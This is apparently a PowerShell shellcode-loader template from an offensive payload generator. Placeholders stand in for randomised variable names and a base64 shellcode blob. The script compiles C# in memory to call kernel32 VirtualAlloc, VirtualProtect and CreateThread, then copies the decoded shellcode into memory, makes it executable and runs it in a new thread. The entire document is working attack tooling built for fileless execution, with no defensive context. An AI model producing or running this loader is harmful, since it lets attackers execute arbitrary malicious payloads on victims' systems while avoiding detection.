Set-StrictMode -Version 2
$%{var_syscode} = @"
	using System;
	using System.Runtime.InteropServices;
	namespace %{var_kernel32} {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ReadWrite = 0x04, Execute= 0x10 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, int flNewProtect,out int lpflOldProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

$%{var_codeProvider} = New-Object Microsoft.CSharp.CSharpCodeProvider
$%{var_compileParams} = New-Object System.CodeDom.Compiler.CompilerParameters
$%{var_compileParams}.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$%{var_compileParams}.GenerateInMemory = $True
$%{var_output} = $%{var_codeProvider}.CompileAssemblyFromSource($%{var_compileParams}, $%{var_syscode})

[Byte[]]$%{var_code} = [System.Convert]::FromBase64String("%{b64shellcode}")
[Uint32]$%{var_opf} = 0

$%{var_baseaddr} = [%{var_kernel32}.func]::VirtualAlloc(0, $%{var_code}.Length + 1, [%{var_kernel32}.func+AllocationType]::Reserve -bOr [%{var_kernel32}.func+AllocationType]::Commit, [%{var_kernel32}.func+MemoryProtection]::ReadWrite)
if ([Bool]!$%{var_baseaddr}) { $global:result = 3; return }
[System.Runtime.InteropServices.Marshal]::Copy($%{var_code}, 0, $%{var_baseaddr}, $%{var_code}.Length)

if ([%{var_kernel32}.func]::VirtualProtect($%{var_baseaddr},[Uint32]$%{var_code}.Length + 1, [%{var_kernel32}.func+MemoryProtection]::Execute, [Ref]$%{var_opf}) -eq $true ) {
	[IntPtr] $%{var_threadHandle} = [%{var_kernel32}.func]::CreateThread(0,0,$%{var_baseaddr},0,0,0)
	if ([Bool]!$%{var_threadHandle}) { $global:result = 7; return }
	$%{var_temp} = [%{var_kernel32}.func]::WaitForSingleObject($%{var_threadHandle}, [%{var_kernel32}.func+Time]::Infinite)
}
